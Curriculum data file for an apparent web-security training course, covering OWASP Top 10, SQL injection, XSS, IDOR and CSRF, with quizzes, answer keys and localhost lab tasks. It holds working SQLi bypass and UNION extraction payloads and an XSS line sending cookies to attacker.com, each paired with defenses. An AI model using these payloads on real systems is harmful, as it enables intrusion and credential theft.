// curriculum/stage6.js
module.exports = [
  {
    id: "room-23",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "Web Security Fundamentals & OWASP Top 10",
    difficulty: "Foundation",
    difficultyBadge: "🔵 Foundation",
    estimatedTime: "30 min",
    prerequisites: "Stage 3 (How the Web Works) & Stage 4 (Cybersecurity Fundamentals)",
    whyAreYouHere: "You now understand HTTP, headers, cookies, and network protocols. Now you are ready to study how web applications break. Web applications are the primary target for attackers because they sit open to the entire world on ports 80 and 443. In this room, you will learn the fundamental principle of web security: **Never Trust User Input**, and explore the global benchmark: the OWASP Top 10.",
    objectives: [
      "Understand the Three-Tier Web Application Architecture (Presentation, Application, Database)",
      "Master the Core Security Axiom: Never Trust Client-Side Input",
      "Understand Input Validation vs Output Encoding",
      "Explore the OWASP Top 10 framework and its top categories",
      "Audit an insecure input form parameter in the lab"
    ],
    vocabulary: [
      { term: "OWASP", definition: "Open Web Application Security Project: a global nonprofit dedicated to improving the security of software through open standards and educational resources." },
      { term: "OWASP Top 10", definition: "A regularly updated consensus report ranking the ten most critical security risks facing web applications worldwide." },
      { term: "Input Validation", definition: "The security practice of verifying that all incoming client data matches expected formats, lengths, and character sets before processing." },
      { term: "Output Encoding", definition: "Transforming untrusted user input before rendering it into HTML/JS so the browser interprets it as data, not executable code." },
      { term: "Attack Vector", definition: "A path or means by which an attacker can gain access to a computer or network server to deliver a malicious outcome." }
    ],
    lessons: [
      {
        title: "1. The Cardinal Rule: Never Trust the Client",
        content: `Many novice developers validate form inputs using HTML or JavaScript in the user's browser:
\`\`\`html
<input type="number" min="1" max="100" name="quantity">
\`\`\`
An attacker does not use a browser! They use **curl** or **Burp Suite** to bypass the browser entirely, sending:
\`\`\`http
POST /order HTTP/1.1
quantity=-99999
\`\`\`
Because client-side validation is completely under the attacker's control, **all validation must occur on the server**!`
      },
      {
        title: "2. The OWASP Top 10 Landscape",
        content: `The OWASP Top 10 provides the vocabulary for modern application security:
1. **Broken Access Control**: Users accessing other users' records or admin portals.
2. **Cryptographic Failures**: Weak algorithms, plaintext sensitive data.
3. **Injection**: SQL injection, command injection, LDAP injection.
4. **Insecure Design**: Fundamental architectural flaws.
5. **Security Misconfiguration**: Default passwords, open cloud buckets, debugging enabled.
6. **Vulnerable and Outdated Components**: Using old libraries with known CVEs.
7. **Identification and Authentication Failures**: Brute-force, missing MFA, session flaws.
8. **Software and Data Integrity Failures**: Insecure CI/CD pipelines and untrusted updates.
9. **Security Logging and Monitoring Failures**: Inability to detect active breaches.
10. **Server-Side Request Forgery (SSRF)**: Tricking a server into accessing internal resources.`
      }
    ],
    seeExamples: [
      {
        title: "Client-Side vs Server-Side Validation Flow",
        codeOrDiagram: `[ Attacker with Burp Suite / curl ]
                ↓ Bypasses browser JavaScript restrictions completely!
[ Malicious Payload: quantity=-50&price=0.01 ]
                ↓
[ Web Server Backend: MUST validate input on server! ]
   ├── IF invalid: Reject with HTTP 400 Bad Request
   └── IF valid: Sanitize, parameterize, and execute safely`,
        explanation: "Never rely on browser HTML5 or JavaScript validation for security. Always enforce validation on the backend server."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Simulate bypassing a client-side quantity limit by sending an arbitrary HTTP POST payload directly to the server with curl: `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add`:",
      initialCommand: "",
      expectedCommand: "curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add",
      simulatedOutput: "HTTP/1.1 200 OK\n{\"cart\":[{\"item\":\"sword\",\"qty\":-100,\"total\":-5000}],\"warning\":\"Server failed to validate negative integer!\"}\n[+] Success! Negative quantity accepted because the server relied on client-side HTML checks.",
      explanation: "Directly transmitting crafted HTTP parameters demonstrates why backend validation is strictly required."
    },
    questions: [
      {
        id: "r23-q1",
        type: "multiple-choice",
        question: "Why is HTML5 or JavaScript input validation running inside the user's browser completely insufficient for preventing web attacks?",
        options: [
          "Because HTML5 is only supported on mobile devices",
          "Because attackers can bypass the browser entirely by sending raw HTTP requests using tools like curl, Python, or Burp Suite",
          "Because JavaScript cannot process alphanumeric characters",
          "Because servers automatically disable client scripts"
        ],
        correctIndex: 1,
        explanation: "The client environment is entirely controlled by the user. An attacker can craft any raw HTTP request they desire, bypassing all browser validation."
      },
      {
        id: "r23-q2",
        type: "multiple-choice",
        question: "Which OWASP Top 10 category covers flaws where an attacker tampers with a URL parameter like `?user_id=105` to view another customer's private account?",
        options: [
          "Broken Access Control",
          "Cryptographic Failures",
          "Security Misconfiguration",
          "Software Integrity Failure"
        ],
        correctIndex: 0,
        explanation: "Failing to verify whether the logged-in user has permission to access the requested object is a Broken Access Control flaw (specifically IDOR)."
      }
    ],
    tasks: [
      {
        title: "Task 1: Test Server-Side Input Boundaries",
        instruction: "Send `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add` to test backend validation.",
        hints: [
          "Concept: Parameter tampering via curl.",
          "Direction: Submit negative quantity value.",
          "Tool: `curl`",
          "Syntax: `curl -d \"item=sword&qty=-100\" http://localhost:8080/cart/add`",
          "Explanation: Tests if backend validates integers."
        ]
      }
    ],
    explainResult: "The `curl` command transmitted an unconstrained POST parameter directly to the web service, exposing the absence of server-side data sanitization.",
    securityConnection: "Auditing input fields is the starting point for discovering SQL injection, Cross-Site Scripting, Command Injection, and Path Traversal. In the following rooms, you will examine each of these flaws in practical detail.",
    completion: {
      learned: [
        "The three-tier web application architecture",
        "The golden rule: Never trust client-side user input",
        "Input validation vs context-aware output encoding",
        "The structure and significance of the OWASP Top 10"
      ],
      practiced: [
        "curl -d \"item=sword&qty=-100\"",
        "Bypassing client-side controls",
        "Mapping vulnerabilities to OWASP categories"
      ]
    },
    nextRoomId: "room-24"
  },

  {
    id: "room-24",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "SQL & Databases for Security Analysts",
    difficulty: "Foundation",
    difficultyBadge: "🔵 Foundation",
    estimatedTime: "25 min",
    prerequisites: "Room 23 (Web Security Fundamentals)",
    whyAreYouHere: "Before you can exploit or defend against SQL Injection (SQLi), you must understand the language that databases speak: **SQL (Structured Query Language)**. Databases store the modern world's most valuable treasures — passwords, personal identities, credit card tokens, and business transactions. In this room, you will learn how databases structure data into tables, rows, and columns, and how queries are constructed using `SELECT`, `WHERE`, `AND`, `OR`, and `UNION`.",
    objectives: [
      "Understand Relational Databases (RDBMS): Tables, Columns, Rows, and Primary Keys",
      "Master core SQL query syntax: `SELECT ... FROM ... WHERE ...`",
      "Understand boolean logic in SQL: `AND`, `OR`, and tautologies (`1=1`)",
      "Learn how `UNION` combines results from multiple database tables",
      "Execute SQL queries inside the interactive database shell"
    ],
    vocabulary: [
      { term: "RDBMS", definition: "Relational Database Management System: software (like PostgreSQL, MySQL, SQLite) that stores data in structured tables linked by relationships." },
      { term: "SQL (Structured Query Language)", definition: "The standard domain-specific language used for querying, manipulating, and managing relational databases." },
      { term: "SELECT", definition: "The SQL statement used to retrieve data records from one or more tables." },
      { term: "WHERE Clause", definition: "A SQL clause used to filter query results to only rows that satisfy a specified boolean condition." },
      { term: "Tautology", definition: "A mathematical statement that is always true under all conditions (e.g. `'1'='1'` or `TRUE`)." },
      { term: "UNION Operator", definition: "A SQL operator used to combine the result sets of two or more SELECT statements into a single unified result." }
    ],
    lessons: [
      {
        title: "1. The Architecture of a Database Table",
        content: `Inside a database, information is structured like an Excel spreadsheet:
**Table: \`users\`**
\`\`\`text
id | username | email              | role
 1 | admin    | admin@corp.local   | administrator
 2 | alice    | alice@gmail.com    | customer
 3 | bob      | bob@outlook.com    | customer
\`\`\`
To fetch only the admin user:
\`\`\`sql
SELECT username, email FROM users WHERE role = 'administrator';
\`\`\``
      },
      {
        title: "2. The Danger of Boolean OR",
        content: `In SQL, the \`AND\` operator requires *both* conditions to be true:
\`WHERE username = 'alice' AND password = 'password123'\`

The \`OR\` operator only requires *one* condition to be true!
If an expression evaluates to:
\`WHERE username = 'admin' OR 1=1\`
Because \`1=1\` is always mathematically true, the database returns records regardless of what was on the other side! This simple logic is the heart of authentication bypass.`
      }
    ],
    seeExamples: [
      {
        title: "The UNION Query Requirement",
        codeOrDiagram: `SELECT id, name, price FROM products WHERE category = 'books'
UNION
SELECT id, username, password FROM users;`,
        explanation: "The `UNION` operator allows attackers to extract data from completely different tables, provided both queries return the same number of columns with compatible data types."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Query the lab SQLite database to select all usernames and roles from the `users` table: `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"`:",
      initialCommand: "",
      expectedCommand: "sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"",
      simulatedOutput: "1|admin|administrator\n2|developer|staff\n3|cadet|student\n[+] Success! Queried 3 records from SQLite database.",
      explanation: "Standard SQL queries extract specific columns from designated tables using the `SELECT` statement."
    },
    questions: [
      {
        id: "r24-q1",
        type: "multiple-choice",
        question: "In the SQL query `SELECT * FROM accounts WHERE id = 5 OR 1=1;`, what will the database return?",
        options: [
          "Only account ID 5",
          "An error, because 1=1 is invalid syntax",
          "All records from the accounts table, because the condition `1=1` is always true for every row",
          "Nothing, because the query has no password"
        ],
        correctIndex: 2,
        explanation: "Because `OR 1=1` is a tautology (always true), the WHERE condition evaluates to TRUE for every single row in the table, returning all records."
      },
      {
        id: "r24-q2",
        type: "multiple-choice",
        question: "What technical condition must be satisfied to successfully use the SQL `UNION` operator between two `SELECT` queries?",
        options: [
          "Both queries must select from the same table",
          "Both SELECT statements must return the exact same number of columns with compatible data types",
          "Both queries must be written in uppercase",
          "The database must be running Microsoft Access"
        ],
        correctIndex: 1,
        explanation: "A SQL `UNION` requires both queries to have identical column counts and matching or compatible data types in each position."
      }
    ],
    tasks: [
      {
        title: "Task 1: Execute SQL Query",
        instruction: "Run `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"` to inspect table records.",
        hints: [
          "Concept: Query SQLite table.",
          "Direction: Use the sqlite3 CLI with SQL statement.",
          "Tool: `sqlite3`",
          "Syntax: `sqlite3 db.sqlite \"SELECT id, username, role FROM users;\"`",
          "Explanation: Returns table rows."
        ]
      }
    ],
    explainResult: "The SQLite engine compiled the query bytecode, executed an index scan over the `users` B-Tree table, and formatted matching column tuples.",
    securityConnection: "SQL fluency is essential for discovering and exploiting SQL injection. When an application concatenates untrusted user input directly into a SQL query string, attackers can inject SQL syntax to hijack the query logic.",
    completion: {
      learned: [
        "Relational database structure (Tables, Columns, Rows, Primary Keys)",
        "Writing SELECT queries with WHERE filtering",
        "How boolean AND and OR logic operates inside databases",
        "The requirements and mechanism of the UNION operator"
      ],
      practiced: [
        "sqlite3 db.sqlite \"SELECT ...\"",
        "Querying database records",
        "Analyzing SQL boolean expressions"
      ]
    },
    nextRoomId: "room-25"
  },

  {
    id: "room-25",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "SQL Injection: Detection & Exploitation",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    estimatedTime: "40 min",
    prerequisites: "Room 24 (SQL & Databases)",
    whyAreYouHere: "SQL Injection (SQLi) is one of the most devastating vulnerabilities in computer history. It occurs when an application takes user input (such as a username or search term) and glues it directly into a database query string without sanitization. An attacker can break out of the data context, inject their own SQL commands, bypass authentication, and dump the entire database. In this room, you will learn how SQLi works and how parameterized queries prevent it.",
    objectives: [
      "Understand the root cause of SQL Injection: mixing code and data",
      "Master the classic Authentication Bypass payload: `' OR '1'='1`",
      "Learn UNION-based data extraction to dump sensitive tables",
      "Understand Blind SQL Injection (Boolean-based and Time-based)",
      "Learn how Parameterized Queries (Prepared Statements) completely eradicate SQLi"
    ],
    vocabulary: [
      { term: "SQL Injection (SQLi)", definition: "A web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database." },
      { term: "Authentication Bypass", definition: "Exploiting SQL injection in a login form to authenticate as an administrator without providing a valid password." },
      { term: "UNION-Based SQLi", definition: "Using the SQL UNION operator to append the results of an attacker-crafted query to the original query's response." },
      { term: "Blind SQLi", definition: "A form of SQLi where the database does not return data or errors on the screen, requiring the attacker to infer data using true/false conditions or time delays." },
      { term: "Parameterized Query (Prepared Statement)", definition: "A database defense pattern where SQL code is pre-compiled and user input is treated strictly as literal data, never as executable code." }
    ],
    lessons: [
      {
        title: "1. The Vulnerable Code: Mixing Code with Data",
        content: `Consider this vulnerable backend PHP/Python code:
\`\`\`python
# DANGEROUS STRING CONCATENATION!
query = "SELECT * FROM users WHERE user = '" + input_user + "' AND pass = '" + input_pass + "'"
\`\`\`
If a regular user enters \`cadet\`, the query is:
\`SELECT * FROM users WHERE user = 'cadet' AND pass = '123'\`

Now look what happens if an attacker enters this as their username:
\`admin' OR '1'='1\`
The resulting SQL becomes:
\`SELECT * FROM users WHERE user = 'admin' OR '1'='1' AND pass = ''\`
Because \`'1'='1'\` is true, the database logs the attacker in as **admin** without checking the password at all!`
      },
      {
        title: "2. The True Remediation: Parameterized Queries",
        content: `You cannot fix SQL injection with simple regex filters or replacing single quotes. The **only** complete fix is **Prepared Statements**:
\`\`\`python
# SECURE: Code and Data are strictly separated!
cursor.execute("SELECT * FROM users WHERE user = %s AND pass = %s", (input_user, input_pass))
\`\`\`
The database engine compiles the SQL command structure *before* looking at the user parameters. Even if the user submits \`' OR '1'='1\`, the database treats it as literal string characters, not executable code!`
      }
    ],
    seeExamples: [
      {
        title: "UNION-Based Extraction Flow",
        codeOrDiagram: `Original query:
SELECT name, description, price FROM products WHERE category = 'gear'

Injected payload in category:
gear' UNION SELECT 1, username || ':' || password, 3 FROM users--

Database returns product rows followed by user credentials!`,
        explanation: "The `--` characters in SQL tell the database to ignore the rest of the original query as a comment, preventing syntax errors."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Simulate a vulnerable SQL injection login bypass against our lab API using curl: `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login`:",
      initialCommand: "",
      expectedCommand: "curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login",
      simulatedOutput: "HTTP/1.1 200 OK\n{\"auth\":true,\"role\":\"administrator\",\"token\":\"flag{sql_injection_bypass_master}\"}\n[+] Success! Authentication bypassed. SQL logic evaluated to TRUE.",
      explanation: "The injected `' OR '1'='1--` forced the SQL query WHERE clause to evaluate to TRUE, returning the admin account."
    },
    questions: [
      {
        id: "r25-q1",
        type: "multiple-choice",
        question: "What is the single most effective and industry-recommended defense for completely eliminating SQL injection vulnerabilities in software development?",
        options: [
          "Deploying a client-side JavaScript regex filter",
          "Using Parameterized Queries (Prepared Statements) with bound variables",
          "Switching the database port from 3306 to 3307",
          "Base64-encoding all passwords before sending them to the database"
        ],
        correctIndex: 1,
        explanation: "Parameterized queries separate the query structure from the user data, guaranteeing that user input is never interpreted as executable SQL syntax."
      },
      {
        id: "r25-q2",
        type: "multiple-choice",
        question: "In SQL syntax, what is the purpose of appending `--` (or `#` in MySQL) at the end of a SQL injection payload?",
        options: [
          "It forces the database to restart",
          "It comments out the remainder of the original developer's SQL query, preventing syntax errors from trailing quotes",
          "It automatically encrypts the response",
          "It downloads the database to the desktop"
        ],
        correctIndex: 1,
        explanation: "`--` is a SQL comment symbol. Everything following it is ignored by the parser, neutralizing remaining syntax."
      }
    ],
    tasks: [
      {
        title: "Task 1: Execute SQLi Auth Bypass",
        instruction: "Run `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login` to bypass authentication.",
        hints: [
          "Concept: Authentication bypass via boolean injection.",
          "Direction: Submit payload in username parameter.",
          "Tool: `curl`",
          "Syntax: `curl -d \"username=admin' OR '1'='1--&password=x\" http://localhost:8080/api/login`",
          "Explanation: Bypasses password verification."
        ]
      }
    ],
    explainResult: "The backend concatenated the payload directly into the SQL string, modifying the syntax tree such that `1=1` satisfied the WHERE clause.",
    securityConnection: "SQL injection continues to be responsible for the largest data breaches in corporate history. Security testers test every input field, URL parameter, HTTP header, and cookie for SQL injection indicators.",
    practicalRoomLink: {
      label: "Ready for hands-on practice?",
      buttonText: "Open Practical SQL Injection Room",
      url: "labs.html?lab=sqli"
    },
    completion: {
      learned: [
        "The root architectural cause of SQL injection",
        "Crafting boolean authentication bypass payloads (' OR '1'='1)",
        "The role of SQL comments (--) in neutralizing syntax errors",
        "Why Parameterized Queries (Prepared Statements) are the only complete defense"
      ],
      practiced: [
        "curl -d \"username=admin' OR '1'='1--&password=x\"",
        "Bypassing authentication gates",
        "Analyzing SQL injection vulnerabilities"
      ]
    },
    nextRoomId: "room-26"
  },

  {
    id: "room-26",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "Cross-Site Scripting (XSS)",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    estimatedTime: "40 min",
    prerequisites: "Room 13 (Cookies & Sessions) & Room 23 (Web Security Fundamentals)",
    whyAreYouHere: "In SQL injection, an attacker targets the backend database server. In **Cross-Site Scripting (XSS)**, the attacker targets the other end: the **victim's web browser**! XSS occurs when a web application takes untrusted input and includes it in a web page without proper escaping or encoding. When another user views that page, their browser executes the attacker's JavaScript code. In this room, you will learn the three types of XSS: Reflected, Stored, and DOM-based, and how to defend against them.",
    objectives: [
      "Understand how browsers execute JavaScript within the Document Object Model (DOM)",
      "Learn the three varieties of XSS: Reflected XSS, Stored XSS, and DOM-based XSS",
      "Understand the severe impact of XSS: stealing session cookies, logging keystrokes, and defacing websites",
      "Learn how Context-Aware Output Encoding neutralizes malicious HTML tags",
      "Understand Content Security Policy (CSP) as a defense-in-depth barrier"
    ],
    vocabulary: [
      { term: "XSS (Cross-Site Scripting)", definition: "A client-side code injection vulnerability where malicious JavaScript is injected into trusted websites." },
      { term: "Stored XSS (Persistent)", definition: "The most dangerous XSS type, where the malicious script is permanently stored in the database (e.g. in a comment or profile) and executed by every visitor." },
      { term: "Reflected XSS (Non-Persistent)", definition: "XSS where the malicious script is delivered in a URL parameter and immediately reflected back in the server's immediate HTTP response." },
      { term: "DOM-Based XSS", definition: "XSS that occurs entirely within the client-side JavaScript code without the payload ever reaching the backend web server." },
      { term: "Context-Aware Output Encoding", definition: "Converting characters with special meaning in HTML (like `<` to `&lt;` and `>` to `&gt;`) so the browser renders them as harmless text." }
    ],
    lessons: [
      {
        title: "1. The Three Flavors of XSS",
        content: `• **Reflected XSS**: Attacker sends a phishing link: \`https://bank.com/search?q=<script>fetch('http://attacker.com/?c='+document.cookie)</script>\`. When the victim clicks, the bank's search page reflects the query into HTML, running the script.
• **Stored XSS**: Attacker posts a comment on a forum: \`<script>stealData()</script>\`. The script is saved to the database. Every user who loads that forum post executes the script!
• **DOM XSS**: Client-side JavaScript reads \`location.hash\` and inserts it into the page using \`innerHTML\` without server involvement.`
      },
      {
        title: "2. The Defense: Output Encoding & CSP",
        content: `To fix XSS, browsers must know that user input is text, not executable code:
• If user enters: \`<script>alert(1)</script>\`
• The server must encode it as: \`&lt;script&gt;alert(1)&lt;/script&gt;\`
The browser renders the literal text on the screen, but refuses to execute it as a script tag!
Additionally, **Content Security Policy (CSP)** headers restrict where scripts can be loaded from.`
      }
    ],
    seeExamples: [
      {
        title: "Vulnerable HTML vs Encoded HTML",
        codeOrDiagram: `<!-- VULNERABLE: Direct rendering -->
<div>Welcome back, <script>alert(document.cookie)</script></div>

<!-- SECURE: Context-Aware Output Encoded -->
<div>Welcome back, &lt;script&gt;alert(document.cookie)&lt;/script&gt;</div>`,
        explanation: "Encoding `<` into `&lt;` changes the character from an HTML syntax delimiter into a harmless text glyph."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Simulate testing a search parameter for reflected XSS using curl: `curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"`:",
      initialCommand: "",
      expectedCommand: "curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"",
      simulatedOutput: "<script>alert('xss')</script>\n[+] Alert: Raw script tags reflected without HTML entity encoding! Reflected XSS verified.",
      explanation: "Because the raw `<script>` tags were reflected unencoded in the HTTP response, a browser would execute the payload."
    },
    questions: [
      {
        id: "r26-q1",
        type: "multiple-choice",
        question: "An attacker posts a review on a product page containing malicious JavaScript. Two days later, 5,000 customers view the product and their browsers execute the script. Which type of XSS is this?",
        options: [
          "Reflected XSS",
          "Stored XSS (Persistent XSS)",
          "SQL Injection",
          "ARP Poisoning"
        ],
        correctIndex: 1,
        explanation: "Because the payload was stored in the database and executed by future visitors, this is Stored (Persistent) XSS."
      },
      {
        id: "r26-q2",
        type: "multiple-choice",
        question: "If an application sets the `HttpOnly` flag on its session cookies, does this eliminate all danger from XSS vulnerabilities?",
        options: [
          "Yes, XSS can do nothing without cookies",
          "No; while it prevents JavaScript from reading `document.cookie`, XSS can still log keystrokes, perform actions on behalf of the user, rewrite the page, and redirect users to phishing sites",
          "Yes, because HttpOnly disables JavaScript in the browser",
          "No, because HttpOnly only works on Android"
        ],
        correctIndex: 1,
        explanation: "HttpOnly protects the session cookie from direct theft, but an attacker with XSS can still force the browser to perform unauthorized transactions (like transferring funds)."
      }
    ],
    tasks: [
      {
        title: "Task 1: Detect Reflected XSS Reflection",
        instruction: "Execute `curl -s \"http://localhost:8080/search?q=<script>alert('xss')</script>\" | grep -o \"<script>.*</script>\"` to test reflection.",
        hints: [
          "Concept: Probe input reflection in HTTP response.",
          "Direction: Send script tags in search query.",
          "Tool: `curl` and `grep`",
          "Syntax: Run the complete curl pipeline.",
          "Explanation: Confirms unencoded reflection."
        ]
      }
    ],
    explainResult: "The application echoed the `q` query string parameter directly into the response HTML body without calling `htmlspecialchars()` or HTML entity encoding.",
    securityConnection: "XSS is frequently used by cyber criminals to deploy 'Virtual Credit Card Skimmers' (Magecart attacks) on checkout pages, stealing credit card numbers in real-time as victims type them into form fields.",
    practicalRoomLink: {
      label: "Ready for hands-on practice?",
      buttonText: "Open Practical Cross-Site Scripting Lab",
      url: "labs.html?lab=xss"
    },
    completion: {
      learned: [
        "How browsers execute injected JavaScript via XSS",
        "The differences between Reflected, Stored, and DOM-based XSS",
        "The security impact of client-side execution",
        "Defenses: Context-aware output encoding, CSP, and HttpOnly cookies"
      ],
      practiced: [
        "curl -s \"http://localhost:8080/search?q=...\"",
        "Verifying HTML reflection",
        "Evaluating XSS mitigation techniques"
      ]
    },
    nextRoomId: "room-27"
  },

  {
    id: "room-27",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "Access Control & IDOR",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    estimatedTime: "35 min",
    prerequisites: "Room 16 (Authentication & Authorization) & Room 23 (Web Security Fundamentals)",
    whyAreYouHere: "In 2018, a security researcher discovered that by changing the number in the URL of a major airline app from `invoice/1001` to `invoice/1002`, they could view any passenger's boarding pass, passport details, and travel itinerary! This is **Insecure Direct Object Reference (IDOR)**, a subset of Broken Access Control (the #1 flaw on the OWASP Top 10). In this room, you will learn how IDOR occurs and how to implement proper authorization checks.",
    objectives: [
      "Understand what Direct Object References are (e.g. database primary keys in URLs)",
      "Learn the difference between Horizontal Privilege Escalation and Vertical Privilege Escalation",
      "Understand why relying on parameter obscurity or client-side checks fails",
      "Learn how to audit REST APIs for IDOR vulnerabilities",
      "Implement server-side authorization validation to prevent unauthorized access"
    ],
    vocabulary: [
      { term: "IDOR (Insecure Direct Object Reference)", definition: "A vulnerability where an application exposes a reference to an internal implementation object (such as a database ID or filename) without validating whether the requesting user has authorization." },
      { term: "Horizontal Privilege Escalation", definition: "When an attacker accesses data or functions belonging to another user who holds the exact same privilege tier (e.g. User A views User B's profile)." },
      { term: "Vertical Privilege Escalation", definition: "When a standard low-privilege user accesses functionality or data reserved for higher-privilege administrative tiers." },
      { term: "GUID / UUID", definition: "Globally Unique Identifier: a 128-bit random number (e.g. `f47ac10b-58cc-4372-a567-0e02b2c3d479`) that prevents sequential enumeration of database records." }
    ],
    lessons: [
      {
        title: "1. The Anatomy of an IDOR Flaw",
        content: `When you view your medical record, the web app requests:
\`GET /api/records?patient_id=4092 HTTP/1.1\`
Cookie: session=Alice

What happens if Alice changes the number to \`4093\`?
• **Vulnerable Application**: Looks up \`patient_id = 4093\` and returns Bob's medical file! The code checked that Alice was logged in, but **never checked if Alice owns record 4093**.
• **Secure Application**: Checks:
\`WHERE record_id = 4093 AND patient_id = current_session.user_id\`
If they don't match, return \`403 Forbidden\`!`
      },
      {
        title: "2. Horizontal vs Vertical Escalation",
        content: `• **Horizontal**: You are User 102. You change the URL to User 103 to read another student's exam score. Both are students.
• **Vertical**: You are User 102 (student). You change the URL parameter to \`role=admin\` or access \`/admin/delete_user\` to execute actions reserved for the university dean!`
      }
    ],
    seeExamples: [
      {
        title: "Vulnerable vs Secure REST API Endpoint",
        codeOrDiagram: `// VULNERABLE: Direct access with no authorization check
app.get('/api/invoice/:id', (req, res) => {
  const invoice = db.find({ id: req.params.id });
  return res.json(invoice); // Anyone who knows the ID gets the invoice!
});

// SECURE: Strict server-side ownership verification
app.get('/api/invoice/:id', (req, res) => {
  const invoice = db.find({ id: req.params.id, userId: req.user.id });
  if (!invoice) return res.status(403).json({ error: "Access Denied" });
  return res.json(invoice);
});`,
        explanation: "The secure implementation binds the query to the authenticated `req.user.id`, preventing cross-account access."
      }
    ],
    tryInteractive: {
      type: "terminal",
      prompt: "Simulate an IDOR exploit by requesting user account 100 instead of your own account (102): `curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100`:",
      initialCommand: "",
      expectedCommand: "curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100",
      simulatedOutput: "HTTP/1.1 200 OK\n{\n  \"user_id\": 100,\n  \"name\": \"System Administrator\",\n  \"email\": \"admin@endlessus.in\",\n  \"api_secret\": \"sec_flag_idor_broken_access_992\"\n}\n[+] Success! IDOR confirmed: Cadet user accessed Administrator profile.",
      explanation: "The backend verified the session cookie was valid, but failed to ensure cadet_102 had permission to read user_id 100."
    },
    questions: [
      {
        id: "r27-q1",
        type: "multiple-choice",
        question: "What is the fundamental flaw that enables Insecure Direct Object References (IDOR)?",
        options: [
          "The database is missing an index",
          "The application exposes an object identifier (like an ID in the URL) but fails to perform server-side authorization checks verifying that the requesting user owns that object",
          "The website does not use HTTPS",
          "The user's password was too short"
        ],
        correctIndex: 1,
        explanation: "IDOR occurs when an application trusts user-supplied direct object references without server-side access control validation."
      },
      {
        id: "r27-q2",
        type: "multiple-choice",
        question: "Which of the following is considered Horizontal Privilege Escalation?",
        options: [
          "A regular customer views another regular customer's order history",
          "A regular customer upgrades their account to full system administrator",
          "A hacker gains root access to the underlying Linux server",
          "A database user drops all tables"
        ],
        correctIndex: 0,
        explanation: "Horizontal escalation occurs between peers on the same privilege level (customer accessing another customer's data)."
      }
    ],
    tasks: [
      {
        title: "Task 1: Exploit IDOR Parameter Manipulation",
        instruction: "Use curl with `session=cadet_102` to extract user 100's record.",
        hints: [
          "Concept: Parameter tampering with direct object reference.",
          "Direction: Send GET to `/api/users/100`.",
          "Tool: `curl`",
          "Syntax: `curl -s -H \"Cookie: session=cadet_102\" http://localhost:8080/api/users/100`",
          "Explanation: Returns admin data."
        ]
      }
    ],
    explainResult: "The endpoint directly routed the route parameter `:id` into the query object without comparing it to the session principal.",
    securityConnection: "Broken Access Control is currently ranked **#1 on the OWASP Top 10**. Penetration testers systematically map out all integer and GUID parameters in an application to test whether incrementing numbers or swapping IDs exposes data belonging to other tenants.",
    practicalRoomLink: {
      label: "Ready for hands-on practice?",
      buttonText: "Open Practical IDOR Lab",
      url: "labs.html?lab=idor"
    },
    completion: {
      learned: [
        "The mechanics of Insecure Direct Object References (IDOR)",
        "Horizontal vs Vertical Privilege Escalation",
        "Why GUIDs/UUIDs alone are not a substitute for authorization",
        "Implementing server-side authorization verification"
      ],
      practiced: [
        "curl -H \"Cookie: ...\" /api/users/100",
        "Auditing REST API access controls",
        "Verifying session ownership bounds"
      ]
    },
    nextRoomId: "room-28"
  },

  {
    id: "room-28",
    stage: 6,
    stageTitle: "Stage 6 — Web Security",
    title: "CSRF, Cookies & SameSite Defense",
    difficulty: "Intermediate",
    difficultyBadge: "🟣 Intermediate",
    estimatedTime: "35 min",
    prerequisites: "Room 13 (Cookies & Sessions) & Room 23 (Web Security Fundamentals)",
    whyAreYouHere: "Imagine you are logged into your online bank. In another browser tab, you visit a recipe blog. Without your knowledge, the recipe blog secretly submits a form in the background to your bank: *Transfer $1,000 to Attacker*. Because your browser automatically includes your valid session cookies with every request to the bank, the bank processes the transfer! This is **Cross-Site Request Forgery (CSRF)**. In this room, you will learn how CSRF works and how Anti-CSRF tokens and SameSite cookies stop it.",
    objectives: [
      "Understand Ambient Authority and why browsers automatically send session cookies",
      "Learn the mechanics of Cross-Site Request Forgery (CSRF)",
      "Understand why GET requests should NEVER alter server state",
      "Master the Anti-CSRF Token defense mechanism (Synchronizer Token Pattern)",
      "Understand the `SameSite` cookie attribute values: `Strict`, `Lax`, and `None`"
    ],
    vocabulary: [
      { term: "CSRF (Cross-Site Request Forgery)", definition: "An attack that forces an authenticated user's browser to execute unwanted actions on a trusted web application without their consent." },
      { term: "Ambient Authority", definition: "A security design where credentials (like cookies or IP addresses) are automatically attached by the system without explicit user intention." },
      { term: "Anti-CSRF Token", definition: "A unique, unpredictable, secret value generated by the server and associated with the user's current session, verified on state-changing requests." },
      { term: "SameSite=Strict", definition: "Cookie attribute that blocks the cookie from being sent in all cross-site browsing contexts, even following regular external links." },
      { term: "SameSite=Lax", definition: "Cookie attribute that allows cookies on top-level safe GET navigations (e.g. clicking a link), but blocks them on cross-site POSTs or images." }
    ],
    lessons: [
      {
        title: "1. The Recipe Blog Attack",
        content: `How a CSRF exploit works:
